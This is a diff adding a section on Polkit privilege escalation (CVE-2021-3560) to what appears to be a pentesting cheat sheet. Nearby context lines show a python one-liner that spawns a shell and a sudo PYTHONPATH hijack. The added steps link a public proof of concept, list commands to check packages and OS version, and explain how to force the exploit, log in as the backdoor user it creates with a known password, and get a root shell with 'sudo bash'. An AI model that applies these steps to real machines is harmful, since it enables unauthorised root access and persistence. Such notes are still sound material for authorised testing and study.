@@ -1249,3 +1249,33 @@ python3 -c 'import os; os.system("/bin/sh")'
 ```
 sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
 ```
+
+### Manual Polkit Priv Esc Checks
+
+* POC:&#x20;
+* [https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)
+* Target needs to have `accountservice` and `gnome-control-center` installed&#x20;
+
+```
+#centos/fed/rhel
+rpm -qa accountservice
+rpm -qa gnome-control-center
+#deb/ubu
+dpkg -l | grep accountservice
+dpkg -l | grep gnome-control-center
+```
+
+* Must have `polkit` version 0.113 or later OR `0-105-26` (Debian fork of `polkit`
+* Works with `Ubuntu 20.04` and `Centos 8`, `RHEL 8`, `Fedora 21`, `Debian Bullseye`
+
+```
+cat /etc/os-release
+```
+
+* Usually need to run the POC multiple times
+* For exploitation dispite checks saying not vulnerable: `./polkit.sh -f=y`
+* If run with no options, user `secnigma` will be added to `/etc/passwd` and the password for that user is `secnigmaftw`
+* To get your root shell `su - secnigma`
+* Enter password
+* `sudo bash`
+* Profit
